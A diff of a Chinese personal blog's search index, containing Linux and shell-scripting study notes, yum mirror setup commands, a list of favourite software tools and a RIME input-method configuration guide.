-<li>centos7第一个进程：systemd（配置文件：&#x2F;usr&#x2F;system&#x2F;systemd&#x2F;）</li>
-<li>执行登录 &#x2F;bin&#x2F;login</li>
-</ol>
-</li>
-<li><p>demesg | less：“|”管道符，左侧命令输出作为右侧的输入</p>
-</li>
-<li><p>&#x2F;dev：设备 –&gt; 文件</p>
-</li>
-<li><p>&#x2F;usr：unix shared resources（共享资源）「类似win的Program Files」</p>
-</li>
-<li><p>&#x2F;src：原文件</p>
-</li>
-<li><p>&#x2F;tmp：临时文件</p>
-</li>
-<li><p>&#x2F;var（variable）：日志文件、打印机脱机工作文件、缓冲区</p>
-</li>
-<li><p>&#x2F;opt（option）：选项文件</p>
-</li>
-<li><p>&#x2F;mnt（mount）：挂载</p>
-</li>
-<li><p>cd：change directory</p>
-</li>
-<li><p>文件类型：</p>
-<ol>
-<li>d：目录</li>
-<li>l：链接</li>
-<li>b：块设备</li>
-<li>c：字符设备文件</li>
-<li>-：普通文件</li>
-</ol>
-</li>
-<li><p>文件权限：</p>
-<ol>
-<li>用户组：U &#x2F; G &#x2F; A</li>
-<li>九位字母表示法：d[文件类型] rwx[文件属主] r-x[同组用户] r–[其他用户]</li>
-</ol>
-</li>
-<li><p>cat快速编辑：</p>
-<ol>
-<li>cat&gt;test</li>
-<li>[输入字符]</li>
-</ol>
-</li>
-<li><p>tail &amp; head：查看后十行，前十行 &#x2F;&#x2F;-n num : 指定行数</p>
-</li>
-<li><p>mdir [ -m ] [ -p 目录名 ]</p>
-</li>
-<li><p>rmdir（remove dir）：用于删除空目录</p>
-<ol>
-<li>rm -r</li>
-</ol>
-</li>
-<li><p>touch：修改时间属性 * （不存在）创建文件</p>
-</li>
-<li><p>软链接：ln -s</p>
-</li>
-<li><p>硬链接：ln</p>
-<ol>
-<li>以文件副本形式存在，不占用实际控件</li>
-<li>不允许目录硬链接</li>
-<li>只有在同一个文件系统才允许硬链接</li>
-</ol>
-</li>
-<li><p>查找类：which、whereis、find、grep</p>
-</li>
-<li><p>文件重定向：</p>
-<ul>
-<li>&#x2F;dev&#x2F;stdin：标准输入文件</li>
-<li>&#x2F;dev&#x2F;stdout：标准输出文件</li>
-</ul>
-<ol>
-<li>输出重定向<ol>
-<li>“&gt;”：文件存在，覆盖</li>
-<li>“&gt;&gt;”：文件存在，添加内容到文件末尾</li>
-</ol>
-</li>
-<li>输入重定向<ol>
-<li>“&lt;”</li>
-</ol>
-</li>
-<li>管道符重定向：“|” 左输出为右输入</li>
-</ol>
-</li>
-</ol>
-<h1 id="yum包管理"><a href="#yum包管理" class="headerlink" title="yum包管理"></a>yum包管理</h1><ul>
-<li><p>centos镜像源文件的目录默认路径：<br><code>/etc/yum.repos.d/</code></p>
-</li>
-<li><p>备份：<br><code>cp /etc/yum.repos.d/CentOS-Linux-BaseOS.repo /etc/yum.repos.d/CentOS-Linux-BaseOS.repo.bak</code></p>
-</li>
-</ul>
-<h2 id="换源"><a href="#换源" class="headerlink" title="换源"></a>换源</h2><ul>
-<li><p>下载国内常用的镜像源并重命名为CentOS-Linux-BaseOS.repo,将其作为当前系统的镜像源</p>
-<p>  +【阿里源】</p>
-  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">##CentOS 8</span><br><span class="line">wget -O /etc/yum.repos.d/CentOS-Linux-BaseOS.repo  http://mirrors.aliyun.com/repo/Centos-8.repo</span><br></pre></td></tr></table></figure>
-<ul>
-<li>在使用阿里云的 centos8 的 yum 时报错：由于centos8 在2022年停止服务，后继版本为8-steam  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">##CentOS 8-stream</span><br><span class="line">wget -O /etc/yum.repos.d/CentOS-Base.repo https://mirrors.aliyun.com/repo/Centos-vault-8.5.2111.repo</span><br></pre></td></tr></table></figure>
-  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl -o /etc/yum.repos.d/CentOS-Base.repo https://mirrors.aliyun.com/repo/Centos-vault-8.5.2111.repo</span><br></pre></td></tr></table></figure></li>
-<li>【网易源】</li>
-</ul>
-  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wget -O /etc/yum.repos.d/CentOS-Linux-BaseOS.repo  http://mirrors.163.com/.help/CentOS8-Base-163.repo</span><br></pre></td></tr></table></figure>
-<ul>
-<li>『添加epel源』</li>
-</ul>
-  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wget -P /etc/yum.repos.d/ http://mirrors.aliyun.com/repo/epel-7.repo</span><br></pre></td></tr></table></figure>
-<ul>
-<li>『清华源』：<a href="https://mirror.tuna.tsinghua.edu.cn/help/centos/">Guide</a></li>
-</ul>
-</li>
-<li><p>清理缓存</p>
-<p>  yum的缓存文件的存放目录是以下路径下：&#x2F;var&#x2F;cache&#x2F;yum 直接清空给目录，或者使用一下命令均可</p>
-  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">yum clean all</span><br></pre></td></tr></table></figure></li>
-<li><p>重新生成缓存</p>
-  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">yum makecache</span><br></pre></td></tr></table></figure>
-<h2 id="常用操作"><a href="#常用操作" class="headerlink" title="常用操作"></a>常用操作</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">yum update</span><br><span class="line">yum makecache</span><br><span class="line">yum clean all</span><br><span class="line">yum info [pagename]</span><br><span class="line">yum list</span><br><span class="line">yum search</span><br></pre></td></tr></table></figure>
-<h1 id="SHELL"><a href="#SHELL" class="headerlink" title="SHELL"></a>SHELL</h1></li>
-</ul>
-<ol>
-<li><h2 id="shell概念"><a href="#shell概念" class="headerlink" title="shell概念"></a>shell概念</h2><ul>
-<li>shell程序就是一个包含若干行shell或者linux命令的文件.</li>
-<li>像编写高级语言的程序一样，编写一个shell程序需要一个文本编辑器.如ⅥM等.</li>
-<li>在文本编辑环境下，依据shell的语法规则，输入一些shell&#x2F;linux命令行，形成一个完整的程序文件.</li>
-<li>执行shell程序文件有三种方法<ol>
-<li>#chmod +x file（在&#x2F;etc&#x2F;profile中，加入export PATH&#x3D;${PATH}:~&#x2F;yourpath，就可以在命令行下直接运行，像执行普通命令一样）</li>
-<li>#. file</li>
-<li>#sh file</li>
-<li>#source file</li>
-</ol>
-</li>
-<li>在编写shell时，第一行一定要指明系统需要那种shell解释你的shell程序（如：#! &#x2F;bin&#x2F;bash,#! &#x2F;bin&#x2F;csh,&#x2F;bin&#x2F;tcsh，还是#! &#x2F;bin&#x2F;pdksh .）</li>
-<li>接口概念：在计算机体系结构中，操作系统是最接近硬件的软件部分，其更侧重从软件和功能的角度出发去描述部件，所以称之为<strong>设备控制器</strong>；而在计算机组成原理中，研究的重点在于硬件组成部分，其更青睐于从硬件的角度出发去描述部件，所以称之为<strong>I&#x2F;O接口</strong>。</li>
-</ul>
-</li>
-</ol>
-<h2 id="各类Shell"><a href="#各类Shell" class="headerlink" title="各类Shell"></a>各类Shell</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo $SHELL</span><br><span class="line">echo $0</span><br><span class="line">cat /etc/shells</span><br></pre></td></tr></table></figure>
-<ol>
-<li><p>bash</p>
-</li>
-<li><p>zsh</p>
-<ul>
-<li>zshell简介：Zsh（Z-shell）是一款用于交互式使用的shell，也可以作为脚本解释器来使用。其包含了 bash，ksh，tcsh 等其他shell中许多优秀功能，也拥有诸多自身特色。</li>
-<li>zshell发展历史：Zsh初版由原作者保罗·弗斯塔德（Paul Falstad）于1990年在普林斯顿大学求学时编写 [3] 。其名称zsh源于普林斯顿大学助教的邵中（Zhong Shao，现任耶鲁大学教授）——保罗将邵中的用户名”zsh”作为此Shell的名称</li>
-<li>zsh美化<h2 id="SHELL文件类型"><a href="#SHELL文件类型" class="headerlink" title="SHELL文件类型"></a>SHELL文件类型</h2>&#x2F; vim test1.sh<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chmod +x test1.sh</span><br><span class="line">./test1.sh</span><br></pre></td></tr></table></figure>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sh test1.sh</span><br></pre></td></tr></table></figure>
-<h2 id="SHELL基本操作"><a href="#SHELL基本操作" class="headerlink" title="SHELL基本操作"></a>SHELL基本操作</h2></li>
-</ul>
-</li>
-<li><p>变量赋值调用</p>
- <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo $0 $1 $2 </span><br></pre></td></tr></table></figure>
- <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sh echotest1.sh 0 1 2 3</span><br><span class="line"><span class="meta">#</span><span class="language-bash">output:0 1 2</span></span><br></pre></td></tr></table></figure></li>
-<li><p>expr：数值计算</p>
-<ul>
-<li>“+、-、\、&#x2F;、%”</li>
-<li>用法：“ $ () ”、“$ []”<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">expr 2 + 3</span><br><span class="line"># output：5</span><br></pre></td></tr></table></figure></li>
-</ul>
-</li>
-<li><p>shell脚本</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd /home</span><br><span class="line">touch test1</span><br><span class="line">mkdir test1</span><br><span class="line">mv test1 /test1</span><br></pre></td></tr></table></figure>
-<ol>
-<li>判断语法（a[]、test ?）<ol>
-<li>文件类判断<ul>
-<li>-e filename #如果 filename为目录，则为真</li>
-<li>-f filename #如果 filename为常规文件，则为真</li>
-<li>-L filename #如果 filename为符号链接，则为真</li>
-<li>-r filename #如果 filename可读，则为真</li>
-<li>-w filename #如果 filename可写，则为真</li>
-<li>-x filename #如果 filename可执行，则为真</li>
-<li>-s filename #如果文件长度不为0，则为真</li>
-<li>-h filename #如果文件是软链接，则为真</li>
-</ul>
-</li>
-<li>数值比较判断<ul>
-<li>-eq：等于为真</li>
-<li>-ne：不等于为真</li>
-<li>-lt：小于为真</li>
-<li>-le：小于等于为真</li>
-<li>-gt：大于为真</li>
-<li>-ge：大于等于为真</li>
-</ul>
-</li>
-<li>字符串判断<ul>
-<li>str：str非空，真</li>
-<li>s1 &#x3D; s2</li>
-<li>s1 !&#x3D; s2</li>
-<li>-n str：str不为0，真</li>
-<li>-z str：str为0，真</li>
-</ul>
-</li>
-<li>组合语法<ul>
-<li>！：逻辑非</li>
-<li>-a：逻辑与</li>
-<li>-o：逻辑或</li>
-<li>(  )：表达式分组，优先级区分</li>
-</ul>
-</li>
-</ol>
-<ul>
-<li><p>#如果&#x3D;&#x3D;文件夹&#x3D;&#x3D;不存在，则创建文件夹</p>
-  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tempPath=&quot;/home/parasaga/blank&quot;</span><br><span class="line">if [ ! -d &quot;$tempPath&quot; ]; </span><br><span class="line">then mkdir $blankPath</span><br><span class="line">fi</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>#如果&#x3D;&#x3D;文件&#x3D;&#x3D;不存在，则创建文件</p>
-  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tempFile=&quot;/home/parasaga/blank/error.log&quot;</span><br><span class="line">if [ ! -f &quot;$tempFile&quot; ]; </span><br><span class="line">then touch $tempFile</span><br><span class="line">fi</span><br></pre></td></tr></table></figure>
-  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if [ ! -f test1 ]</span><br><span class="line">then echo &quot;flase&quot;</span><br><span class="line">else</span><br><span class="line">echo &quot;true&quot;</span><br><span class="line">fi</span><br></pre></td></tr></table></figure></li>
-</ul>
-</li>
-</ol>
-<ul>
-<li><p>演示示例</p>
-   <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">read s1</span><br><span class="line">if [ $s1 == 1 ]</span><br><span class="line">then echo 123</span><br><span class="line">mkdir shell1</span><br><span class="line">elif [ $s1 == 2 ]</span><br><span class="line">then echo 321</span><br><span class="line">		mkdir shell2</span><br><span class="line">else</span><br><span class="line">		echo finding</span><br><span class="line">if [  -d shell1 ]</span><br><span class="line">then    rm -r shell1</span><br><span class="line">		echo ok1</span><br><span class="line">fi</span><br><span class="line">if [  -d shell2 ]</span><br><span class="line">then rm -r shell2</span><br><span class="line">		echo ok2</span><br><span class="line">else</span><br><span class="line">		echo false</span><br><span class="line">fi</span><br><span class="line">fi       </span><br></pre></td></tr></table></figure></li>
-</ul>
-<ol start="2">
-<li><p>函数定义</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">functionname</span><br><span class="line">&#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function getSum()&#123;</span><br><span class="line">SUM=$[$n1+$n2]</span><br><span class="line">echo &quot;sum=$SUM&quot;</span><br><span class="line">&#125;   </span><br><span class="line"></span><br><span class="line">read -p &quot;请输入第一个参数n1：&quot; n1</span><br><span class="line">read -p &quot;请输入第二个参数n2：&quot; n2</span><br><span class="line"></span><br><span class="line"># 调用 getSum 函数</span><br><span class="line">getSum $n1 $n2</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>循环语句</p>
-<ul>
-<li><p>while</p>
-  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">while 条件（为真时执行）</span><br><span class="line">do</span><br><span class="line">	语句</span><br><span class="line">done</span><br></pre></td></tr></table></figure></li>
-<li><p>until：测试发生在循环末尾，因此循环至少<strong>执行一次</strong></p>
-  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">until 条件</span><br><span class="line">do</span><br><span class="line">	语句</span><br><span class="line">done</span><br></pre></td></tr></table></figure></li>
-<li><p>for</p>
-  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">for 变量名 [ in 数值列表 ]</span><br><span class="line">do</span><br><span class="line">	语句</span><br><span class="line">done</span><br></pre></td></tr></table></figure></li>
-<li><pre><code>exit 0
-</code></pre>
-</li>
-</ul>
-</li>
-</ol>
-</li>
-</ol>
-]]></content>
-      <categories>
-        <category>开源项目</category>
-        <category>LINUX OS</category>
-      </categories>
-      <tags>
-        <tag>操作系统</tag>
-        <tag>Linux</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>MY FAVOR TOOLS BANK (我的&quot;武器/装备&quot;库)</title>
-    <url>/2022/03/22/My-Attack-Tools/</url>
-    <content><![CDATA[<h1 id="开源项目"><a href="#开源项目" class="headerlink" title="开源项目"></a>开源项目</h1><h2 id="JOPLIN"><a href="#JOPLIN" class="headerlink" title="JOPLIN"></a>JOPLIN</h2><h2 id="ANKI"><a href="#ANKI" class="headerlink" title="ANKI"></a>ANKI</h2><h2 id="MARKTEST"><a href="#MARKTEST" class="headerlink" title="MARKTEST"></a>MARKTEST</h2><h2 id="RIME"><a href="#RIME" class="headerlink" title="RIME"></a>RIME</h2><h2 id="ASF"><a href="#ASF" class="headerlink" title="ASF"></a>ASF</h2><h2 id="Virtualbox"><a href="#Virtualbox" class="headerlink" title="Virtualbox"></a>Virtualbox</h2><h2 id="PotPlayer"><a href="#PotPlayer" class="headerlink" title="PotPlayer"></a>PotPlayer</h2><h2 id="Neat-Download-Manager"><a href="#Neat-Download-Manager" class="headerlink" title="Neat Download Manager"></a>Neat Download Manager</h2><h2 id="OllyDBG"><a href="#OllyDBG" class="headerlink" title="OllyDBG"></a>OllyDBG</h2><h1 id="商业软件（部分含community版）"><a href="#商业软件（部分含community版）" class="headerlink" title="商业软件（部分含community版）"></a>商业软件（部分含community版）</h1><h2 id="Vmware"><a href="#Vmware" class="headerlink" title="Vmware"></a>Vmware</h2><h2 id="Wireshark"><a href="#Wireshark" class="headerlink" title="Wireshark"></a>Wireshark</h2><h2 id="Arduino"><a href="#Arduino" class="headerlink" title="Arduino"></a>Arduino</h2><h2 id="Pycharm"><a href="#Pycharm" class="headerlink" title="Pycharm"></a>Pycharm</h2><h2 id="Visual-Studio"><a href="#Visual-Studio" class="headerlink" title="Visual Studio"></a>Visual Studio</h2><h2 id="Visual-Studio-IDE"><a href="#Visual-Studio-IDE" class="headerlink" title="Visual Studio IDE"></a>Visual Studio IDE</h2>]]></content>
-      <categories>
-        <category>开源项目</category>
-        <category>software</category>
-      </categories>
-      <tags>
-        <tag>tools</tag>
-        <tag>open source</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>LINUX-PENETRATION</title>
     <url>/2021/12/25/LINUX-PENETRATION/</url>
     <content><![CDATA[<h1 id="NMAP高级嗅探"><a href="#NMAP高级嗅探" class="headerlink" title="NMAP高级嗅探"></a>NMAP高级嗅探</h1><h2 id="网络-防火墙逃逸嗅探"><a href="#网络-防火墙逃逸嗅探" class="headerlink" title="(网络)防火墙逃逸嗅探"></a>(网络)防火墙逃逸嗅探</h2><ol>
@@ -1170,9 +1169,123 @@
         <category>WEB渗透</category>
       </categories>
       <tags>
+        <tag>Linux</tag>
         <tag>渗透</tag>
         <tag>网络空间安全</tag>
-        <tag>Linux</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>MY FAVOR TOOLS BANK</title>
+    <url>/2022/03/22/My-Attack-Tools/</url>
+    <content><![CDATA[<h1 id="开源项目"><a href="#开源项目" class="headerlink" title="开源项目"></a>开源项目</h1><h2 id="JOPLIN"><a href="#JOPLIN" class="headerlink" title="JOPLIN"></a>JOPLIN</h2><h2 id="ANKI"><a href="#ANKI" class="headerlink" title="ANKI"></a>ANKI</h2><h2 id="MARKTEST"><a href="#MARKTEST" class="headerlink" title="MARKTEST"></a>MARKTEST</h2><h2 id="RIME"><a href="#RIME" class="headerlink" title="RIME"></a>RIME</h2><h2 id="ASF"><a href="#ASF" class="headerlink" title="ASF"></a>ASF</h2><h2 id="Virtualbox"><a href="#Virtualbox" class="headerlink" title="Virtualbox"></a>Virtualbox</h2><h2 id="PotPlayer"><a href="#PotPlayer" class="headerlink" title="PotPlayer"></a>PotPlayer</h2><h2 id="Neat-Download-Manager"><a href="#Neat-Download-Manager" class="headerlink" title="Neat Download Manager"></a>Neat Download Manager</h2><h2 id="OllyDBG"><a href="#OllyDBG" class="headerlink" title="OllyDBG"></a>OllyDBG</h2><h1 id="商业软件（部分含community版）"><a href="#商业软件（部分含community版）" class="headerlink" title="商业软件（部分含community版）"></a>商业软件（部分含community版）</h1><h2 id="Vmware"><a href="#Vmware" class="headerlink" title="Vmware"></a>Vmware</h2><h2 id="Wireshark"><a href="#Wireshark" class="headerlink" title="Wireshark"></a>Wireshark</h2><h2 id="Arduino"><a href="#Arduino" class="headerlink" title="Arduino"></a>Arduino</h2><h2 id="Pycharm"><a href="#Pycharm" class="headerlink" title="Pycharm"></a>Pycharm</h2><h2 id="Visual-Studio"><a href="#Visual-Studio" class="headerlink" title="Visual Studio"></a>Visual Studio</h2><h2 id="Visual-Studio-IDE"><a href="#Visual-Studio-IDE" class="headerlink" title="Visual Studio IDE"></a>Visual Studio IDE</h2>]]></content>
+      <categories>
+        <category>开源项目</category>
+        <category>software</category>
+      </categories>
+      <tags>
+        <tag>tools</tag>
+        <tag>open source</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>RIME CONFIG GUIDE</title>
+    <url>/2021/12/25/RIME-CONfIG/</url>
+    <content><![CDATA[<h1 id="x2F-rime-x2F-build-x2F-ibus-rime-yaml"><a href="#x2F-rime-x2F-build-x2F-ibus-rime-yaml" class="headerlink" title="&#x2F;rime&#x2F;build&#x2F;ibus_rime.yaml"></a>&#x2F;rime&#x2F;build&#x2F;ibus_rime.yaml</h1><p>ibus-rime候选横竖列文件</p>
+<h1 id="x2F-rime-x2F-default-custom-yaml"><a href="#x2F-rime-x2F-default-custom-yaml" class="headerlink" title="&#x2F;rime&#x2F;default.custom.yaml"></a>&#x2F;rime&#x2F;default.custom.yaml</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">patch:</span><br><span class="line">	<span class="string">&quot;menu/page_size&quot;</span>: <span class="number">7</span> <span class="comment">#每页候选词个数</span></span><br><span class="line">	<span class="string">&quot;ascii_composer/switch_key/Shift_L&quot;</span>: commit_code <span class="comment">#左shift提交字母</span></span><br><span class="line">	<span class="string">&quot;style/horizontal&quot;</span>: true      <span class="comment"># 候選橫排</span></span><br></pre></td></tr></table></figure>
+<h1 id="x2F-ibus-x2F-rime-x2F-luna-pinyin-custom-yaml"><a href="#x2F-ibus-x2F-rime-x2F-luna-pinyin-custom-yaml" class="headerlink" title="&#x2F;ibus&#x2F;rime&#x2F;luna_pinyin.custom.yaml"></a>&#x2F;ibus&#x2F;rime&#x2F;luna_pinyin.custom.yaml</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">patch:</span><br><span class="line">	switches:                   <span class="comment"># 注意縮進</span></span><br><span class="line">	- name: ascii_mode</span><br><span class="line">	reset: <span class="number">0</span>                <span class="comment"># reset 0 的作用是當從其他輸入方案切換到本方案時，</span></span><br><span class="line">	states: [ 中文, 西文 ]  <span class="comment"># 重設爲指定的狀態，而不保留在前一個方案中設定的狀態。</span></span><br><span class="line">	- name: full_shape        <span class="comment"># 選擇輸入方案後通常需要立即輸入中文，故重設 ascii_mode = 0；</span></span><br><span class="line">	states: [ 半角, 全角 ]  <span class="comment"># 而全／半角則可沿用之前方案中的用法。</span></span><br><span class="line">	- name: simplification</span><br><span class="line">	reset: <span class="number">1</span>                <span class="comment"># 增加這一行：默認啓用「繁→簡」轉換。</span></span><br><span class="line">	states: [ 漢字, 汉字 ]</span><br></pre></td></tr></table></figure>
+<h1 id="weasel-custom-yaml"><a href="#weasel-custom-yaml" class="headerlink" title="weasel.custom.yaml"></a>weasel.custom.yaml</h1><h2 id="P站配色主题风格"><a href="#P站配色主题风格" class="headerlink" title="P站配色主题风格"></a>P站配色主题风格</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">patch:</span><br><span class="line"><span class="comment"># rime输入法自定义P站配色风格主题</span></span><br><span class="line">	<span class="string">&quot;style/layout/round_corner&quot;</span>:<span class="number">5</span></span><br><span class="line">	<span class="string">&quot;style/color_scheme&quot;</span>::p</span><br><span class="line">	  <span class="string">&quot;style/horizontal&quot;</span>: true  <span class="comment">#横向排列</span></span><br><span class="line">	<span class="string">&quot;preset_color_schemes/:p&quot;</span>:</span><br><span class="line">		author:BLACK</span><br><span class="line">		name::p</span><br><span class="line">		back_color:<span class="number">0x000000</span></span><br><span class="line">		label_color:<span class="number">0xffffff</span></span><br><span class="line">		border_color:<span class="number">0x000000</span></span><br><span class="line">		text_color:<span class="number">0xffffff</span></span><br><span class="line">		hilited_text_color:<span class="number">0x000000</span></span><br><span class="line">		hilited_back_color:<span class="number">0x009bff</span></span><br><span class="line">		candidate_text_color:<span class="number">0xffffff</span></span><br><span class="line">		hilited_candidate_text_color:<span class="number">0x000000</span></span><br><span class="line">		hilited_candidate_back_color:<span class="number">0x009bff</span></span><br><span class="line">		comment_text_color:<span class="number">0xffffff</span></span><br><span class="line">		hilited_lable_color:<span class="number">0x000000</span></span><br></pre></td></tr></table></figure>
+<pre><code>• 输入法代号：ibus-rime
+• 用户资料夹： ~/.config/ibus/rime/
+• 共享资料夹： /usr/share/rime-data/
+</code></pre>
+<p>共享资料夹包含预设输入方案的源文件。 这些文件属于 Rime 所发行软件的一部份，在访问权限控制较严格的系统上对用户是只读的，因此谢绝软件版本更新以外的任何修改—— 一旦用户修改这里的文件，很可能影响后续的软件升级或在升级时丢失数据。<br>在「部署 Rime」操作时，将用到这里的输入方案源文件、并结合用户定制的内容来编译预设输入方案。</p>
+<h1 id="「用户资料夹」数据说明"><a href="#「用户资料夹」数据说明" class="headerlink" title="「用户资料夹」数据说明"></a>「用户资料夹」数据说明</h1><h2 id="用户资料夹则包含为用户准备的内容"><a href="#用户资料夹则包含为用户准备的内容" class="headerlink" title="用户资料夹则包含为用户准备的内容"></a>用户资料夹则包含为用户准备的内容</h2><pre><code>• 〔全局設定〕 default.yaml
+• 〔發行版設定〕 ibus-rime.yaml
+• 〔預設輸入方案副本〕 &lt;方案标识&gt;.schema.yaml ibus-rime.schema.yaml
+• ※〔安裝信息〕 installation.yaml
+• ※〔用戶狀態信息〕 user.yaml
+</code></pre>
+<h2 id="编译输入方案所产出的二进制文件："><a href="#编译输入方案所产出的二进制文件：" class="headerlink" title="编译输入方案所产出的二进制文件："></a>编译输入方案所产出的二进制文件：</h2><pre><code>• 〔Rime 棱鏡〕 &lt;方案标识&gt;.prism.bin
+• 〔Rime 固態詞典〕 &lt;词典名&gt;.table.bin
+• 〔Rime 反查詞典〕 &lt;词典名&gt;.reverse.bin
+</code></pre>
+<h2 id="记录用户写作习惯的文件"><a href="#记录用户写作习惯的文件" class="headerlink" title="记录用户写作习惯的文件"></a>记录用户写作习惯的文件</h2><pre><code>• ※〔用戶詞典〕 &lt;词典名&gt;.userdb.kct
+• ※〔用戶詞典快照〕 &lt;词典名&gt;.userdb.txt、&lt;词典名&gt;.userdb.kct.snapshot 見於同步文件夾
+</code></pre>
+<h2 id="用户自己设定的"><a href="#用户自己设定的" class="headerlink" title="用户自己设定的"></a>用户自己设定的</h2><pre><code>• ※〔用戶對全局設定的定製信息〕 default.custom.yaml
+• ※〔用戶對預設輸入方案的定製信息〕 &lt;方案标识&gt;.custom.yaml
+• ※〔用戶自製輸入方案〕及配套的詞典源文件
+</code></pre>
+<p>注：以上标有 ※ 号的文件，包含用户资料，清理文件时要注意备份！</p>
+<h1 id="词库管理"><a href="#词库管理" class="headerlink" title="词库管理"></a>词库管理</h1><ol>
+<li>导入搜狗词库：<ol>
+<li>luna_pinyinn.sogou.dict.yaml <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Rime dictionary</span></span><br><span class="line"><span class="comment"># encoding: utf-8</span></span><br><span class="line">---</span><br><span class="line">name: luna_pinyin.sogou</span><br><span class="line">version: <span class="string">&quot;2015.12.24&quot;</span></span><br><span class="line">sort: by_weight</span><br><span class="line">use_preset_vocabulary: true</span><br><span class="line">import_tables:</span><br><span class="line">  - luna_pinyin</span><br><span class="line">...</span><br><span class="line"><span class="comment">#######后面为词库内容#########</span></span><br></pre></td></tr></table></figure></li>
+<li>luna_pinyin_simp.custom.yaml <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">translator/dictionary: luna_pinyin.sogou  <span class="comment">#导入搜狗词库</span></span><br></pre></td></tr></table></figure></li>
+</ol>
+</li>
+</ol>
+<p>2.特殊字符定义：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;recognizer/patterns/punct&#x27;</span>: <span class="string">&quot;^/[a-z]*$&quot;</span>  <span class="comment">#可以使symbols中的‘/hj’‘/fh’等命令</span></span><br><span class="line"><span class="string">&#x27;punctuator/import_preset&#x27;</span>: symbols       <span class="comment">#将标点设置默认为&#x27;symbols.yaml&#x27;文件</span></span><br><span class="line"><span class="string">&quot;switches/@0/reset&quot;</span>: <span class="number">1</span>  <span class="comment"># 初始的 ascii mode 设置为「西文」</span></span><br></pre></td></tr></table></figure>
+<ol start="3">
+<li>糢糊音定义：<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;speller/algebra&#x27;</span>:</span><br><span class="line">    - erase/^xx$/                      <span class="comment"># 第一行保留</span></span><br><span class="line">    <span class="comment"># 模糊音定義</span></span><br><span class="line">    <span class="comment"># 需要哪組就刪去行首的 # 號，單雙向任選</span></span><br><span class="line">    <span class="comment">#- derive/^([zcs])h/$1/             # zh, ch, sh =&gt; z, c, s</span></span><br><span class="line">    <span class="comment">#- derive/^([zcs])([^h])/$1h$2/     # z, c, s =&gt; zh, ch, sh</span></span><br><span class="line">    <span class="comment">#- derive/^n/l/                     # n =&gt; l</span></span><br><span class="line">    <span class="comment">#- derive/^l/n/                     # l =&gt; n</span></span><br><span class="line">    <span class="comment"># 這兩組一般是單向的</span></span><br><span class="line">    <span class="comment">#- derive/^r/l/                     # r =&gt; l</span></span><br><span class="line">    <span class="comment">#- derive/^ren/yin/                 # ren =&gt; yin, reng =&gt; ying</span></span><br><span class="line">    <span class="comment">#- derive/^r/y/                     # r =&gt; y</span></span><br><span class="line">    <span class="comment"># 下面 hu &lt;=&gt; f 這組寫法複雜一些，分情況討論</span></span><br><span class="line">    <span class="comment">#- derive/^hu$/fu/                  # hu =&gt; fu</span></span><br><span class="line">    - derive/^hong$/feng/              <span class="comment"># hong =&gt; feng</span></span><br><span class="line">    - derive/^hu([<span class="keyword">in</span>])$/fe$<span class="number">1</span>/          <span class="comment"># hui =&gt; fei, hun =&gt; fen</span></span><br><span class="line">    <span class="comment">#- derive/^hu([ao])/f$1/            # hua =&gt; fa, ...</span></span><br><span class="line">    <span class="comment">#- derive/^fu$/hu/                  # fu =&gt; hu</span></span><br><span class="line">    - derive/^feng$/hong/              <span class="comment"># feng =&gt; hong</span></span><br><span class="line">    <span class="comment">#- derive/^fe([in])$/hu$1/          # fei =&gt; hui, fen =&gt; hun</span></span><br><span class="line">    <span class="comment">#- derive/^f([ao])/hu$1/            # fa =&gt; hua, ...</span></span><br><span class="line">    <span class="comment"># 韻母部份</span></span><br><span class="line">    <span class="comment">#- derive/^([bpmf])eng$/$1ong/      # meng = mong, ...</span></span><br><span class="line">    - derive/([ei])n$/$1ng/            <span class="comment"># en =&gt; eng, in =&gt; ing</span></span><br><span class="line">    - derive/([ei])ng$/$1n/            <span class="comment"># eng =&gt; en, ing =&gt; in</span></span><br><span class="line">    - derive/^un/iong/                 <span class="comment"># un =&gt; iong</span></span><br><span class="line">    - derive/^iong/un/                 <span class="comment"># iong =&gt; un</span></span><br><span class="line">    <span class="comment"># 樣例足夠了，其他請自己總結……</span></span><br><span class="line">    <span class="comment"># 反模糊音？</span></span><br><span class="line">    <span class="comment"># 誰說方言沒有普通話精確、有模糊音，就能有反模糊音。</span></span><br><span class="line">    <span class="comment"># 示例爲分尖團的中原官話：</span></span><br><span class="line">    <span class="comment">#- derive/^ji$/zii/   # 